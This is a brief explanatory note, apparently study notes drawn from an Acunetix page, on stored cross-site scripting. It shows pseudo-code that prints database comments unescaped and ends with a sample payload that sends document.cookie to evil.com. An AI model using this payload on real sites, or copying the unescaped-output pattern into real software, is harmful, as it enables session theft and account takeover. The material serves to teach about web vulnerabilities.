[Reference](https://www.acunetix.com/websitesecurity/cross-site-scripting/)

# Cross-site Scripting (XSS) Attack
Client-side code injection attack wherein an attacker can execute malicious scripts into a legitmate website or web application. 

The following server-side pseudo-code is used to display the most recent comment on a web page.
```
print "<html>"
print "<h1>Most recent comment</h1>"
print database.latestComment
print "</html>"
```
The above script is simply printing out the latest comment from a comments database and printing the contents out to an HTML page, assuming that the comment printed out only consists of text.

The above page is vulnerable to XSS because an attacker could submit a comment that contains a malicious payload such as `<script>doSomethingEvil();</script>`.

Users visiting the web page will get served the following HTML page.
```
<html>
<h1>Most recent comment</h1>
<script>doSomethingEvil();</script>
</html>
```
When the page loads in the victim’s browser, the attacker’s malicious script will execute, most often without the user realizing or being able to prevent such an attack.

ex> Stealing cookie
```
<script>
   window.location="http://evil.com/?cookie=" + document.cookie
</script>
```
